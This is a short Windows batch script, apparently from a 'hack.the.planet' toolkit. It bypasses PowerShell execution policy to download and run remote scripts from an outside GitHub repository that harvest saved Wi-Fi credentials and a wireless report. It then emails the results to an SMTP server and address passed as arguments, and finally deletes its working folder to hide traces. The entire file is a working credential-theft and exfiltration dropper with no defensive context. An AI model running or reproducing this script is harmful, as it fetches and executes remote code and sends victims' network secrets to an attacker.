mkdir %TMP%\HackThePlanet 
c:
cd %TMP%\HackThePlanet 
powershell -executionpolicy bypass (New-Object System.Net.WebClient).DownloadFile(\"https://raw.githubusercontent.com/Opvolger/hack.the.planet/master/Wifi/GetWifiCreds.ps1\", \"GetWifiCreds.ps1\") && powershell -executionpolicy bypass (New-Object System.Net.WebClient).DownloadFile(\"https://raw.githubusercontent.com/Opvolger/hack.the.planet/master/Wifi/runall.cmd\", \"runall.cmd\") && powershell -executionpolicy bypass (New-Object System.Net.WebClient).DownloadFile(\"https://raw.githubusercontent.com/Opvolger/hack.the.planet/master/MailMe.ps1\", \"MailMe.ps1\") && runall.cmd && powershell -executionpolicy bypass -File MailMe.ps1 -smtpserver %1 -toaddress %2 -files output.txt,wlan-report-latest.html & cd .. 
powershell -executionpolicy bypass Remove-Item -LiteralPath %TMP%\HackThePlanet -Force -Recurse